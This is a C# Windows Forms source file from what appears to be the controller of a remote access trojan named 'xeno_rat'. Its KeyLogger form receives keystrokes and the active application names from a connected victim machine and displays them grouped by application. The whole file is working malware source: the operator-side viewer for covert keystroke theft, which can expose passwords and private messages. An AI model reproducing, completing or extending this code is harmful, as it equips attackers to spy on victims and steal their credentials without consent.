using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class KeyLogger : Form
    {
        Node client;
        private string selectedItem = null;
        Dictionary<string, string> applications = new Dictionary<string, string>();

        public KeyLogger(Node _client)
        {
            client = _client;
            InitializeComponent();
            recvThread();
        }

        public async Task recvThread()
        {
            while (client.Connected()) 
            {
                try
                {
                    byte[] application = await client.ReceiveAsync();
                    byte[] key = await client.ReceiveAsync();
                    if (application == null || key == null) 
                    {
                        if (!this.IsDisposed)
                        {
                            this.Invoke((MethodInvoker)(() =>
                            {
                                this.Close();
                            }));
                        }
                    }
                    string strapplication = Encoding.UTF8.GetString(application);
                    string strkey = Encoding.UTF8.GetString(key);
                    if (strkey=="") continue; 
                    if (!applications.ContainsKey(strapplication)) 
                    {
                        listView1.Items.Add(new ListViewItem(strapplication));
                        applications[strapplication] = "";
                    }
                    applications[strapplication] += strkey;
                    if (selectedItem == strapplication) 
                    {
                        textBox1.Text = Normalize(applications[selectedItem]);
                    }
                }
                catch{ }
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void KeyLogger_Load(object sender, EventArgs e)
        {

        }
        public string Normalize(string input) 
        {
            return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
        }
        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string firstColumnText = listView1.SelectedItems[0].SubItems[0].Text;
                selectedItem = firstColumnText;
                textBox1.Text = Normalize(applications[firstColumnText]);
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }
    }
}
